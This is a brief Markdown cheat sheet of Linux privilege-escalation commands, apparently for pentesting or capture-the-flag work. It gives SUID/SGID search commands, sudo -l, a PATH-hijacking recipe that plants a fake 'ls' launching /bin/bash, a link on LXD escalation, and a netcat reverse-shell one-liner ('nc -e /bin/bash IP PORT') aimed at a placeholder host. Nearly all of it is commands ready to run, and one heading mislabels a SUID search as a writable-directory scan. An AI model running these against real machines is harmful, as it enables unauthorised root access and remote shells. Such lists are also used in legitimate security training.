# Cheatsheet linux privilege escalation

## SUID scan

```
find / -perm -u=s -type f 2>/dev/null
```

## Writables directory scan

```
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null
```

## Binary with exec rights 

```
find / -type f -perm /6000 -ls 2>/dev/null 
```

## Found specific file

```
binwalk socute.jpg 
```

## Get sudo permissions (Must have the user password)

```
sudo -l
```

## Escalation with path variable (work with suid misconfiguration)

```
cd /tmp
echo “/bin/bash” > ls
chmod 777 ls
echo $PATH
export PATH=/tmp:$PATH
```

## LXD priviliege escalation (Linux Container and Linux Daemon)

https://www.hackingarticles.in/lxd-privilege-escalation/

## Netcat shell redirect

```
nc -e /bin/bash IP PORT
```
